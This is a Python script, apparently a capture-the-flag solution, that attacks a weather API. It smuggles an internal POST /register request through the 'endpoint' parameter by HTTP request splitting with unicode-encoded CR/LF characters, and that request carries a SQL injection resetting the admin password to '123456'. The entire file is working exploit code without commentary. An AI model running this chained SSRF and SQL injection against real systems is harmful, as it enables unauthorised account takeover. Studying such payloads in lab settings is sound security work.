import requests

url = "http://139.59.172.163:31345/api/weather"

username = "admin"
new_password = "123456"
password = f"{new_password}') ON CONFLICT(username) DO UPDATE SET password = '{new_password}';"

username_encoded = username.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %27='
password_encoded = password.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22") # %22="

contentLength = len(username_encoded) + len(password_encoded) + 20

# \u010D = \r, \u010A = \n, \u0120 = space
test = "localhost/abc\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010A"
test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
test = test + f"username={username_encoded}&password={password_encoded}" + "\u010D\u010A\u010D\u010AGET\u0120/?q="
 
r = requests.post(url = url, json={'endpoint': test, 'city': 'Ha Noi','country': 'VN'})
